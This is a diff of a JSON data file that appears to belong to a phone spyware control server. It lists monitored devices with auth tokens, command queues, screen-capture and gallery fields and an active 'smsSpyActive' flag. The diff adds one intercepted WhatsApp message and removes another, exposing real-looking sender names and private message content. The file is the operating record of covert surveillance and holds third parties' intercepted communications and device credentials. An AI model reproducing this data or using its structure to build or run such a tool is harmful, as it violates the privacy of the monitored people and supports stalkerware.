@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775042552129,
+    "lastSeen": 1775042558042,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12548 pesan): ~ 趙雨凡🌼",
+        "content": "💟 Stiker",
+        "time": "01/04 19:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042558360
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (90 pesan): ~ Dark Chocolate 🍫👅",
@@ -4011,14 +4019,6 @@
         "time": "01/04 19:10",
         "pkg": "com.whatsapp",
         "receivedAt": 1775041813429
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "muh jusmin",
-        "content": "Tdk ada pi orng di rumah nu kh",
-        "time": "01/04 19:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775041813410
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775042551491,
+    "lastSeen": 1775042555996,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
